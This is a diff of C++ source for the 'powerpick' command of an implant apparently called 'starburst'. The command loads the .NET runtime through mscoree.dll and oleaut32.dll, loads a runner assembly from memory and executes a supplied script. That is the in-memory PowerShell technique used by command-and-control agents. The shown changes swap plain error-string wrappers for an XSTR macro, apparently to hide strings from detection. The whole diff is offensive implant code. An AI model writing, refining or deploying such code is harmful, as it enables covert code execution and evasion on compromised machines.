@@ -184,13 +184,13 @@ auto declfn starburst::cmd_powerpick(
 
     if ( !asm_data || asm_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no runner assembly" ) ) );
+            XSTR( "no runner assembly" ) );
         return;
     }
 
     if ( !script_str || script_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no script provided" ) ) );
+            XSTR( "no script provided" ) );
         return;
     }
 
@@ -201,7 +201,7 @@ auto declfn starburst::cmd_powerpick(
     auto h_oleaut32 = inst.kernel32.LoadLibraryA( _n1 );
     if ( !h_oleaut32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "oleaut32 load failed" ) ) );
+            XSTR( "oleaut32 load failed" ) );
         return;
     }
 
@@ -225,7 +225,7 @@ auto declfn starburst::cmd_powerpick(
     if ( !pSafeArrayCreate || !pSafeArrayAccessData || !pSafeArrayDestroy ||
          !pSafeArrayCreateVector || !pSafeArrayPutElement || !pSysAllocString ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "oleaut32 API resolution failed" ) ) );
+            XSTR( "oleaut32 API resolution failed" ) );
         return;
     }
 
@@ -254,7 +254,7 @@ auto declfn starburst::cmd_powerpick(
     auto h_mscoree = inst.kernel32.LoadLibraryA( _n2 );
     if ( !h_mscoree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "mscoree.dll load failed" ) ) );
+            XSTR( "mscoree.dll load failed" ) );
         return;
     }
 
@@ -264,7 +264,7 @@ auto declfn starburst::cmd_powerpick(
 
     if ( !pCLRCreateInstance ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CLRCreateInstance not found" ) ) );
+            XSTR( "CLRCreateInstance not found" ) );
         return;
     }
 
@@ -290,7 +290,7 @@ auto declfn starburst::cmd_powerpick(
 
     if ( FAILED( hr ) || !meta_host ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CLRCreateInstance failed" ) ) );
+            XSTR( "CLRCreateInstance failed" ) );
         return;
     }
 
@@ -308,7 +308,7 @@ auto declfn starburst::cmd_powerpick(
 
     if ( FAILED( hr ) || !runtime_info ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetRuntime v4.0 failed" ) ) );
+            XSTR( "GetRuntime v4.0 failed" ) );
         return;
     }
 
@@ -325,7 +325,7 @@ auto declfn starburst::cmd_powerpick(
 
     if ( FAILED( hr ) || !runtime_host ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetInterface ICorRuntimeHost failed" ) ) );
+            XSTR( "GetInterface ICorRuntimeHost failed" ) );
         return;
     }
 
@@ -343,7 +343,7 @@ auto declfn starburst::cmd_powerpick(
 
     if ( FAILED( hr ) || !app_domain_unk ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetDefaultDomain failed" ) ) );
+            XSTR( "GetDefaultDomain failed" ) );
         return;
     }
 
@@ -357,7 +357,7 @@ auto declfn starburst::cmd_powerpick(
 
     if ( FAILED( hr ) || !app_domain ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "QI _AppDomain failed" ) ) );
+            XSTR( "QI _AppDomain failed" ) );
         return;
     }
 
@@ -368,7 +368,7 @@ auto declfn starburst::cmd_powerpick(
     SAFEARRAY* sa_asm = pSafeArrayCreate( VT_UI1, 1, &bounds );
     if ( !sa_asm ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "SafeArrayCreate failed" ) ) );
+            XSTR( "SafeArrayCreate failed" ) );
         return;
     }
 
@@ -387,7 +387,7 @@ auto declfn starburst::cmd_powerpick(
 
     if ( FAILED( hr ) || !assembly ) {
         char err_buf[128] = { 0 };
-        str_copy( err_buf, symbol<char*>( const_cast<char*>( "AppDomain.Load_3 failed: 0x" ) ) );
+        str_copy( err_buf, XSTR( "AppDomain.Load_3 failed: 0x" ) );
         char hex[16];
         int_to_str( hex, hr, 16 );
         str_concat( err_buf, hex );
@@ -404,7 +404,7 @@ auto declfn starburst::cmd_powerpick(
 
     if ( FAILED( hr ) || !method_info ) {
         char err_buf[128] = { 0 };
-        str_copy( err_buf, symbol<char*>( const_cast<char*>( "get_EntryPoint failed: 0x" ) ) );
+        str_copy( err_buf, XSTR( "get_EntryPoint failed: 0x" ) );
         char hex[16];
         int_to_str( hex, hr, 16 );
         str_concat( err_buf, hex );
@@ -481,14 +481,14 @@ auto declfn starburst::cmd_powerpick(
 
     if ( FAILED( hr ) ) {
         char err_msg[128] = { 0 };
-        str_copy( err_msg, symbol<char*>( const_cast<char*>( "Invoke_3 failed: 0x" ) ) );
+        str_copy( err_msg, XSTR( "Invoke_3 failed: 0x" ) );
         char hex[16];
         int_to_str( hex, hr, 16 );
         str_concat( err_msg, hex );
 
         if ( output_buf && output_len > 0 ) {
             output_buf[output_len] = '\0';
-            str_concat( err_msg, symbol<char*>( const_cast<char*>( " | " ) ) );
+            str_concat( err_msg, XSTR( " | " ) );
             str_concat( err_msg, reinterpret_cast<char*>( output_buf ) );
             inst.heap_free( output_buf );
         }
@@ -504,7 +504,7 @@ auto declfn starburst::cmd_powerpick(
         inst.heap_free( output_buf );
     } else {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "(no output)" ) ) );
+            XSTR( "(no output)" ) );
     }
 }
 
